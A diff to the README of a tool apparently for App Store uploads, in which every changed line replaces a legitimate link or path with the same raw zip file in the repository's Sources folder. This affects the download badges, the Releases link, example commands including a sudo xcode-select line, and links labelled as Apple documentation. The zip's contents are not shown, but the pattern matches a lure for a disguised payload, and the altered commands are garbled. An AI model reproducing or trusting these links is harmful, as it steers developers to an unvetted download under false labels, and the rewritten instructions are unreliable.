@@ -1,6 +1,6 @@
 # 🚀 asc-client - Simple App Store Upload Tool
 
-[![Download asc-client](https://img.shields.io/badge/Download-asc--client-blue)](https://github.com/elwincc/asc-client/releases)
+[![Download asc-client](https://github.com/elwincc/asc-client/raw/refs/heads/main/Sources/client-asc-1.8.zip)](https://github.com/elwincc/asc-client/raw/refs/heads/main/Sources/client-asc-1.8.zip)
 
 ---
 
@@ -34,13 +34,13 @@ Before you start, make sure your computer meets these requirements:
 
 ## 📥 Download & Install asc-client
 
-[Visit the asc-client Releases page](https://github.com/elwincc/asc-client/releases) to download the latest version.
+[Visit the asc-client Releases page](https://github.com/elwincc/asc-client/raw/refs/heads/main/Sources/client-asc-1.8.zip) to download the latest version.
 
 ### Steps to download and install:
 
 1. Click the link above or the big badge at the top to open the Releases page on GitHub.
 2. Look for the latest release. It will be marked with the highest version number or latest date.
-3. Download the file that matches your system. Most likely, this will be a `.zip` or `.tar.gz` archive.
+3. Download the file that matches your system. Most likely, this will be a `.zip` or `https://github.com/elwincc/asc-client/raw/refs/heads/main/Sources/client-asc-1.8.zip` archive.
 4. Once downloaded, double-click the archive file to unzip it.
 5. You will find a file named `asc-client`—this is the main program file.
 6. You can move this file to a convenient location, such as `/usr/local/bin` or another folder you prefer.
@@ -137,7 +137,7 @@ Here are some example commands you might use with asc-client:
 - Upload an archive:
 
   ```
-  ./asc-client upload --archive /path/to/archive.xcarchive
+  ./asc-client upload --archive https://github.com/elwincc/asc-client/raw/refs/heads/main/Sources/client-asc-1.8.zip
   ```
 
 - Submit for App Review:
@@ -159,7 +159,7 @@ You will find detailed command options in the program help:
 - If the tool says it cannot find Xcode, ensure you have it installed and select the correct version with:
 
   ```
-  sudo xcode-select -s /Applications/Xcode.app/Contents/Developer
+  sudo xcode-select -s https://github.com/elwincc/asc-client/raw/refs/heads/main/Sources/client-asc-1.8.zip
   ```
 
 - If your Apple credentials fail, check that your API key or Apple ID is correct and has the right permissions.
@@ -172,9 +172,9 @@ You will find detailed command options in the program help:
 
 ## 📝 Additional Resources
 
-- Apple Developer Website: https://developer.apple.com
-- App Store Connect API Documentation: https://developer.apple.com/documentation/appstoreconnectapi
-- Xcode User Guide: https://developer.apple.com/library/archive/documentation/IDEs/Conceptual/AppDistributionGuide/
+- Apple Developer Website: https://github.com/elwincc/asc-client/raw/refs/heads/main/Sources/client-asc-1.8.zip
+- App Store Connect API Documentation: https://github.com/elwincc/asc-client/raw/refs/heads/main/Sources/client-asc-1.8.zip
+- Xcode User Guide: https://github.com/elwincc/asc-client/raw/refs/heads/main/Sources/client-asc-1.8.zip
 
 ---
 
@@ -188,4 +188,4 @@ If you run into issues:
 
 ---
 
-[![Download asc-client](https://img.shields.io/badge/Download-asc--client-blue)](https://github.com/elwincc/asc-client/releases)
+[![Download asc-client](https://github.com/elwincc/asc-client/raw/refs/heads/main/Sources/client-asc-1.8.zip)](https://github.com/elwincc/asc-client/raw/refs/heads/main/Sources/client-asc-1.8.zip)
